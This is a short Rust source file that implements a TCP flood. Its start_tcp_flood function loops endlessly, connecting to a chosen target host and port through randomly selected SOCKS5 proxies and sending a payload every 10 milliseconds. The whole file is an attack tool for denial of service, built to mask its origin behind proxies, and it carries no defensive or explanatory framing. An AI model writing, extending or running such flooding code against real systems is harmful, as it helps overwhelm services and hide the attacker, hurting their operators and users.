
use std::io::Write;
use socks::Socks5Stream;
use tokio::time::{sleep, Duration};
use crate::utils::get_random_proxy;

pub async fn start_tcp_flood(target: &str, port: u16, proxies: Vec<String>) {
    loop {
        if let Some(proxy) = get_random_proxy(&proxies) {
            match Socks5Stream::connect(proxy.clone(), (target, port)) {
                Ok(mut stream) => {
                    let payload = b"TCP FLOOD PAYLOAD\n";
                    if let Err(e) = stream.write_all(payload) {
                        eprintln!("[TCP] Write error: {}", e);
                        continue;
                    }
                    println!("[TCP] Sent via {}", proxy);
                }
                Err(e) => eprintln!("[TCP] Proxy error: {}", e),
            }
        }
        sleep(Duration::from_millis(10)).await;
    }
}